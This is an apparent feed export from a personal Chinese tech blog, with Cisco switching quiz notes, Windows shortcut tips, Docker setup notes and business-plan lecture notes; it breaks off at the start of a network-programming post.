id="Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions"><a href="#Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions" class="headerlink" title="Which solution would help a college alleviate network congestion due to collisions?"></a>Which solution would help a college alleviate network congestion due to collisions?</h3><ul><li><p>a firewall that connects to two Internet providers</p></li><li><p>a high port density switch</p></li><li><p>a router with two Ethernet ports</p></li><li><p>a router with three Ethernet ports</p><blockquote><p><strong>Explanation:</strong>Switches provide microsegmentation so that one device does not compete for the same Ethernet network bandwidth with another network device, thus practically eliminating collisions. A high port density switch provides very fast connectivity for many devices.</p></blockquote></li></ul><p>alleviate：减轻</p><p>congestion：拥塞</p><p>collisions：碰撞</p><h3 id="What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer"><a href="#What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer" class="headerlink" title="What is a basic function of the Cisco Borderless Architecture distribution layer?"></a>What is a basic function of the Cisco Borderless Architecture distribution layer?</h3><ul><li><p>acting as a backbone</p></li><li><p>aggregating all the campus blocks</p></li><li><p>aggregating Layer 3 routing boundaries</p></li><li><p>providing access to end user devices</p><blockquote><p><strong>Explanation:</strong>One of the basic functions of the distribution layer of the Cisco Borderless Architecture is to perform routing between different VLANs. Acting as a backbone and aggregating campus blocks are functions of the core layer. Providing access to end user devices is a function of the access layer.</p></blockquote></li></ul><h3 id="A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two"><a href="#A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two" class="headerlink" title="A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)"></a>A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)</h3><ul><li><p>lower bandwidth requirements</p></li><li><p>reduced cost for equipment and user training</p></li><li><p>easier to provide redundant links to ensure higher availability</p></li><li><p>less required equipment to provide the same performance levels</p></li><li><p>simpler deployment for additional switch equipment</p><blockquote><p><strong>Explanation:</strong>A hierarchical design for switches helps network administrators when planning and deploying a network expansion, performing fault isolation when a problem occurs, and providing resiliency when traffic levels are high. A good hierarchical design has redundancy when it can be afforded so that one switch does not cause all networks to be down.</p></blockquote></li></ul><h3 id="What-does-the-term-“port-density”-represent-for-an-Ethernet-switch"><a href="#What-does-the-term-“port-density”-represent-for-an-Ethernet-switch" class="headerlink" title="What does the term “port density” represent for an Ethernet switch?"></a>What does the term “port density” represent for an Ethernet switch?</h3><ul><li><p>the memory space that is allocated to each switch port</p></li><li><p>the number of available ports</p></li><li><p>the numbers of hosts that are connected to each switch port</p></li><li><p>the speed of each port</p><blockquote><p><strong>Explanation:</strong>The term port density represents the number of ports available in a switch. A one rack unit access switch can have up to 48 ports. Larger switches may support hundreds of ports.</p></blockquote></li></ul><h3 id="What-is-a-definition-of-a-two-tier-LAN-network-design"><a href="#What-is-a-definition-of-a-two-tier-LAN-network-design" class="headerlink" title="What is a definition of a two-tier LAN network design?"></a>What is a definition of a two-tier LAN network design?</h3><ul><li><p>access and core layers collapsed into one tier, and the distribution layer on a separate tier</p></li><li><p>access and distribution layers collapsed into one tier, and the core layer on a separate tier</p></li><li><p>distribution and core layers collapsed into one tier, and the access layer on a separate tier</p></li><li><p>access, distribution, and core layers collapsed into one tier, with a separate backbone layer</p><blockquote><p><strong>Explanation:</strong>Maintaining three separate network tiers is not always required or cost-efficient. All network designs require an access layer, but a two-tier design can collapse the distribution and core layers into one layer to serve the needs of a small location with few users.</p></blockquote></li></ul><h3 id="What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two"><a href="#What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two" class="headerlink" title="What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)"></a>What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)</h3><ul><li><p>to create fewer collision domains</p></li><li><p>to enhance user bandwidth</p></li><li><p>to create more broadcast domains</p></li><li><p>to eliminate virtual circuits</p></li><li><p>to isolate traffic between segments</p></li><li><p>to isolate ARP request messages from the rest of the network</p><blockquote><p><strong>Explanation:</strong>A switch has the ability of creating temporary point-to-point connections between the directly-attached transmitting and receiving network devices. The two devices have full-bandwidth full-duplex connectivity during the transmission.</p></blockquote></li></ul><blockquote><p>A collapsed core design is appropriate for a small, single building business. This type of design uses two layers (the collapsed core and distribution layers consolidated into one layer and the access layer). Larger businesses use the traditional three-tier switch design model</p></blockquote><h3 id="Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected"><a href="#Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected" class="headerlink" title="Which statement describes a result after multiple Cisco LAN switches are interconnected?"></a>Which statement describes a result after multiple Cisco LAN switches are interconnected?</h3><ul><li><p>The broadcast domain expands to all switches.</p></li><li><p>One collision domain exists per switch.</p></li><li><p>Frame collisions increase on the segments connecting the switches.</p></li><li><p>There is one broadcast domain and one collision domain per switch.</p><blockquote><p><strong>Explanation:</strong>In Cisco LAN switches, the microsegmentation makes it possible for each port to represent a separate segment and thus each switch port represents a separate collision domain. This fact will not change when multiple switches are interconnected. However, LAN switches do not filter broadcast frames. A broadcast frame is flooded to all ports. Interconnected switches form one big broadcast domain.</p></blockquote></li></ul><h3 id="What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two"><a href="#What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two" class="headerlink" title="What are two advantages of modular switches over fixed-configuration switches? (Choose two.)"></a>What are two advantages of modular switches over fixed-configuration switches? (Choose two.)</h3><ul><li><p>lower cost per switch</p></li><li><p>increased scalability</p></li><li><p>lower forwarding rates</p></li><li><p>need for fewer power outlets</p></li><li><p>availability of multiple ports for bandwidth aggregation</p><blockquote><p><strong>Explanation:</strong>Fixed-configuration switches, although lower in price, have a designated number of ports and no ability to add ports. They also typically provide fewer high-speed ports. In order to scale switching on a network that consists of fixed-configuration switches, more switches need to be purchased. This increases the number of power outlets that need to be used. Modular switches can be scaled simply by purchasing additional line cards. Bandwidth aggregation is also easier, because the backplane of the chassis can provide the bandwidth that is needed for the switch port line cards.</p></blockquote></li></ul><h3 id="What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two"><a href="#What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two" class="headerlink" title="What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)"></a>What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)</h3><ul><li><p>path cost</p></li><li><p>egress port</p></li><li><p>ingress port</p></li><li><p>destination IP address</p></li><li><p>destination MAC address</p><blockquote><p><strong>Explanation:</strong>Cisco LAN switches use the MAC address table to make decisions of traffic forwarding. The decisions are based on the ingress port and the destination MAC address of the frame. The ingress port information is important because it carries the VLAN to which the port belongs.</p></blockquote></li></ul><h3 id="What-is-one-function-of-a-Layer-2-switch"><a href="#What-is-one-function-of-a-Layer-2-switch" class="headerlink" title="What is one function of a Layer 2 switch?"></a>What is one function of a Layer 2 switch?</h3><ul><li><p>forwards data based on logical addressing</p></li><li><p>duplicates the electrical signal of each frame to every port</p></li><li><p>learns the port assigned to a host by examining the destination MAC address</p></li><li><p>determines which interface is used to forward a frame based on the destination MAC address</p><blockquote><p><strong>Explanation:</strong>A switch builds a MAC address table of MAC addresses and associated port numbers by examining the source MAC address found in inbound frames. To forward a frame onward, the switch examines the destination MAC address, looks in the MAC address for a port number associated with that destination MAC address, and sends it to the specific port. If the destination MAC address is not in the table, the switch forwards the frame out all ports except the inbound port that originated the frame.</p></blockquote></li></ul><h3 id="Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network"><a href="#Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network" class="headerlink" title="Which network device can be used to eliminate collisions on an Ethernet network?"></a>Which network device can be used to eliminate collisions on an Ethernet network?</h3><ul><li><p>firewall</p></li><li><p>hub</p></li><li><p>router</p></li><li><p>switch</p><blockquote><p><strong>Explanation:</strong>A switch provides microsegmentation so that no other device competes for the same Ethernet network bandwidth.</p></blockquote></li></ul><h3 id="What-is-the-destination-address-in-the-header-of-a-broadcast-frame"><a href="#What-is-the-destination-address-in-the-header-of-a-broadcast-frame" class="headerlink" title="What is the destination address in the header of a broadcast frame?"></a>What is the destination address in the header of a broadcast frame?</h3><p>FF-FF-FF-FF-FF-FF</p><blockquote><p>A converged network provides a single infrastructure that combines voice, video, and data. Analog phones, user data, and point-to-point video traffic are all contained within the single network infrastructure of a converged network.</p></blockquote><p>打开交换机时，启动顺序中的第一个操作是什么？</p><p>A. 加载默认 Cisco IOS 软件</p><p>B. 加载启动加载器软件</p><p>C. 低级 CPU 初始化</p><p>D. 加载加电自检程序</p><blockquote><p><strong>答案</strong></p><p>D. 交换机启动后的第一个操作是 POST（加电自检）。POST 对 CPU、内存和闪存进行测试，以准备加载启动加载器。</p></blockquote><p>网络管理员配置了 VLAN 99 作为管理 VLAN，并为其配置 IP 地址和子网掩码。管理员发出 show interface vlan 99 命令并注意到线路协议处于关闭状态。以下哪项操作可以将线路协议的状态更改为开启？</p><p>A. 将主机连接到与 VLAN 99 相关联的接口</p><p>B. 配置默认网关</p><p>C. 从 VLAN 99 中删除所有接入端口</p><p>D. 在 vty 线路上配置传输输入法</p><blockquote><p><strong>答案</strong></p><p>A. 一旦 SVI 配置了 IP 地址和子网掩码，即可用于远程管理。当 SVI VLAN 有一个活动端口与之关联时，SVI 接口处于活动状态。</p></blockquote><p>攻击者已经绕过物理安全并且可以将笔记本电脑连接到交换机上的以太网接口。如果所有交换机端口都配置了端口安全，并且违规模式设置为出厂默认设置，则针对攻击者采取哪项操作？</p><p>A. 具有未知源地址的数据包被丢弃，并且没有已发生安全违规的通知。。</p><p>B. 具有未知源地址的数据包被丢弃，并且有已发生安全违规的通知。</p><p>C. 具有未知源地址的数据包被丢弃，并且接口进入错误禁用状态并关闭端口 LED。</p><p>D. 具有未知源地址的数据包被转发，并且会向 syslog 服务器发送通知。</p><blockquote><p><strong>答案</strong></p><p>C. 默认违规模式已关闭。在此模式下，端口安全违规将造成接口立即变为错误禁用 (error-disabled) 状态，并关闭端口 LED。该模式还会发送 SNMP 陷阱、将 syslog 消息记入日志，以及逐渐增加违规计数器的计数。</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/download.png" class="" title="i291241n1v4.png"><p>似乎是交换机的默认配置。</p><p>使用交换机时，造成不完全以太网帧的潜在原因是什么？</p><p>A. 双工配置错误</p><p>B. 线缆过长</p><p>C. 延迟冲突</p><p>D. NIC 故障</p><blockquote><p><strong>答案</strong></p><p>D. 不完全帧即小于 64 字节的帧，所允许的最小值是以太帧。该类型帧通常是由于 NIC 故障或过度冲突。两端配置错误可能导致连接问题。线缆过长可能产生 CRC 错误和/或延迟冲突。</p></blockquote><p><strong>端口速度 LED</strong> - 表示选择了端口速度模式。 选择后，端口 LED 将显示不同含义的颜色。 如果 LED 不亮，则端口运行速度为 10 Mb/s。 如果 LED 为绿色，则端口运行速度为 100 Mb/s。 如果 LED 为绿色闪烁，则端口运行速度为 1000 Mb/s。</p><p>下列哪项操作可以将错误禁用交换机端口返回至运行状态？</p><p>A. 在接口上删除并重新配置端口安全</p><p>B. 在接口上发出 switchport mode access 命令</p><p>C. 清除交换机上的 MAC 地址表</p><p>D. 发出 shutdown 和 no shutdown 接口命令</p><p><strong>答案</strong></p><p>Option 4. 当配置了端口安全的交换机端口出现违规时会将违规操作关闭，端口将置为 err-disabled 状态。可以通过关闭接口然后发出 no shutdown 命令重新启用接口。</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519101713958.png" class="" title="image-20200519101713958"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519102510122.png" class="" title="image-20200519102510122"><p>交换机引导加载程序的功能是什么？</p><p>A. 加快引导过程</p><p>B. 提供交换机启动时的脆弱状态安全</p><p>C. 控制启动过程中交换机的可用 RAM 量</p><p>D. 提供无法找到交换机操作系统时的操作环境</p><blockquote><p><strong>答案</strong></p><p>Option 4 在交换机找不到有效操作系统时，显示交换机启动加载程序环境。启动加载程序环境提供一些基本命令来允许网络管理员重新加载操作系统或者提供操作系统的备选位置。</p></blockquote><p>哪一命令用于设置定义交换机上 IOS 映像查找位置的 BOOT 环境变量？</p><ul><li><strong>boot system</strong></li></ul><p>哪个接口是包含用于管理 24 个端口以太网交换机的 IP 地址的默认位置？</p><ul><li>VLAN 1</li></ul>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用好用的快捷键（Win）</title>
    <link href="/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/"/>
    <url>/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>写下来新发现的/有需求之后找到的快捷键，希望对各位有帮助</strong></p><h2 id="全局（存疑）"><a href="#全局（存疑）" class="headerlink" title="全局（存疑）"></a>全局（存疑）</h2><h3 id="软件窗口切换"><a href="#软件窗口切换" class="headerlink" title="软件窗口切换"></a>软件窗口切换</h3><p>自由控制方向<code>alt + 方向</code></p><p>依次切换<code>alt + tab</code></p><h3 id="选择已输入的"><a href="#选择已输入的" class="headerlink" title="选择已输入的"></a>选择已输入的</h3><p><code>shift + ←/→方向键</code></p><p>选择当前行</p><p><code>Ctrl + L</code></p><h2 id="游览器"><a href="#游览器" class="headerlink" title="游览器"></a>游览器</h2><h3 id="恢复关闭的页面-隐私模式下无用"><a href="#恢复关闭的页面-隐私模式下无用" class="headerlink" title="恢复关闭的页面(隐私模式下无用)"></a>恢复关闭的页面(隐私模式下无用)</h3><p><code>ctrl + shift + t</code></p><h3 id="页面切换"><a href="#页面切换" class="headerlink" title="页面切换"></a>页面切换</h3><p>顺序切换<code>ctrl + tab</code></p><p>倒叙<code>ctrl + shift + tab</code></p><h3 id="关闭当前页面"><a href="#关闭当前页面" class="headerlink" title="关闭当前页面"></a>关闭当前页面</h3><p><code>ctrl + w</code></p><h2 id="Vs-code"><a href="#Vs-code" class="headerlink" title="Vs code"></a>Vs code</h2><p>点在函数，变量名上 按 F2 一键同名全部改名</p><p>随时可能更新qwq</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker隔离开发环境和宿主</title>
    <link href="/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/"/>
    <url>/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/</url>
    
    <content type="html"><![CDATA[<p>如何把开发环境移到docker里？</p><p>目前设想了有：通过scp传数据，来让宿主机知道docker里安装了啥包。然后对应自动生成dockerfile。通过vscode remote。</p><p>基础镜像，是一开始自己也不知道需要什么包的,所以直接装在镜像里,然后通过python来检测docker里安装了啥东西，再传出来到宿主机补充到dockerfile/自动安装包脚本里。至于开发的文件，git和云同步都挺好。真正做到开发完就丢环境                                 </p><p>补充调查：</p><ul><li><p>docker镜像可以拷贝到u盘上。<a href="https://blog.csdn.net/nimei31/article/details/80716573">link</a></p></li><li><p>vscode remote 远程开发 <a href="https://www.cnblogs.com/tinywan/p/11107397.html">link</a> 主机安装ssh-server，本地安装ssh-client，vscode安装remote development</p></li><li><p><a href="https://www.cnblogs.com/mengw/p/11413461.html">https://www.cnblogs.com/mengw/p/11413461.html</a>)</p></li></ul><h2 id="本机"><a href="#本机" class="headerlink" title="本机"></a>本机</h2><ul><li><p><a href="https://github.com/Microsoft/vscode-remote-try-python">下载</a></p></li><li><p><a href="https://code.visualstudio.com/docs/remote/containers#_getting-started">跟随</a></p></li></ul><p>然后等待下载完就可以了</p><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><p><a href="https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host">https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host</a></p><p>项目搬迁的时候，需要把当前的环境依赖包导出，然后到部署项目的服务器上安装依赖。 我们可以通过下面的命令执行，把依赖包导出到requirements.txt文件里。 生成requirements.txt</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pip <span class="hljs-keyword">freeze</span> &gt; requirements.txt<br></code></pre></td></tr></table></figure><p>安装requirements.txt依赖</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></table></figure><p><a href="https://www.django.cn/forum/forum-10.html">原文</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2020/03/16/docker/"/>
    <url>/2020/03/16/docker/</url>
    
    <content type="html"><![CDATA[<h2 id="群里介绍截图"><a href="#群里介绍截图" class="headerlink" title="群里介绍截图"></a>群里介绍截图</h2><img src="/2020/03/16/docker/image-20200309201430966.png" class="" title="image-20200309201430966"><img src="/2020/03/16/docker/image-20200309201729975.png" class="" title="image-20200309201729975"><img src="/2020/03/16/docker/image-20200309202211814.png" class="" title="image-20200309202211814"><img src="/2020/03/16/docker/image-20200309202523127.png" class="" title="image-20200309202523127"><img src="/2020/03/16/docker/image-20200309202550963.png" class="" title="image-20200309202550963"><img src="/2020/03/16/docker/image-20200309203036752.png" class="" title="image-20200309203036752"><img src="/2020/03/16/docker/image-20200309203235771.png" class="" title="image-20200309203235771"><p>2375:默认端口</p><img src="/2020/03/16/docker/image-20200309203741638.png" class="" title="image-20200309203741638"><p>不过root权限免密登录的是容器</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入<code>docker exec -it ID /bin/bash</code></p><p>查看一下本地的镜像，运行<code>docker images</code></p><p>docker中删除images的命令是<code>docker rmi</code>(此时要求那个没有container在运行才会正确删除)</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</p><p>我的做法是卸载重装= =</p><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/#uninstall-docker-ce">安装</a></p><p><a href="https://blog.csdn.net/wireless911/article/details/88989620">Unable to find image ‘hello-world:latest’ locally）</a></p><img src="/2020/03/16/docker/image-20200316015938550.png" class="" title="image-20200316015938550"><img src="/2020/03/16/docker/image-20200316015938550.png" class="" title="image-20200316015938550">]]></content>
    
    
    <categories>
      
      <category>技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>商业计划书撰写及案例分析</title>
    <link href="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <url>/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154014932.png" class="" title="image-20200303154014932"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154629436.png" class="" title="image-20200303154629436"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154857510.png" class="" title="image-20200303154857510"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155013709.png" class="" title="image-20200303155013709"><p>1，2页，最多3</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155045603.png" class="" title="image-20200303155045603"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155143295.png" class="" title="image-20200303155143295"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155249332.png" class="" title="image-20200303155249332"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155614678.png" class="" title="image-20200303155614678"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155819865.png" class="" title="image-20200303155819865"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160141607.png" class="" title="image-20200303160141607"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160544258.png" class="" title="image-20200303160544258"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160634611.png" class="" title="image-20200303160634611"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161012399.png" class="" title="image-20200303161012399"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161050235.png" class="" title="image-20200303161050235"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161219645.png" class="" title="image-20200303161219645"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161303272.png" class="" title="image-20200303161303272"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161514149.png" class="" title="image-20200303161514149"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303165428331.png" class="" title="image-20200303165428331"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103106419.png" class="" title="image-20200306103106419"><p>分析竞争对手 深入详细 长远目标，现行战略，产品趋势</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103921594.png" class="" title="image-20200306103921594"><p>分析优劣，内外部威胁，外部机会与内部因素相匹配</p><h2 id="评审要点"><a href="#评审要点" class="headerlink" title="评审要点"></a>评审要点</h2><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182110048.png" class="" title="image-20200306182110048"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182240857.png" class="" title="image-20200306182240857"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306190639540.png" class="" title="image-20200306190639540"> <img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306192421339.png" class="" title="image-20200306192421339"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306193534013.png" class="" title="image-20200306193534013"><p>痛点-&gt;解决方案-&gt;证明正确-&gt;商业模式-&gt;市场分析、竞争对手-&gt;商业模式-&gt;取得的成效-&gt;团队，财务，未来</p><p>词汇不要过于专业，也不要太low</p><p>盲审：不涉及产品，拿出数据化的东西</p><p>路演：项目背景，痛点</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络编程</title>
    <link href="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="3-9"><a href="#3-9" class="headerlink" title="3/9"></a>3/9</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113441335.png" class="" title="image-20200309113441335"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113925329.png" class="" title="image-20200309113925329"><p>非阻塞模式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 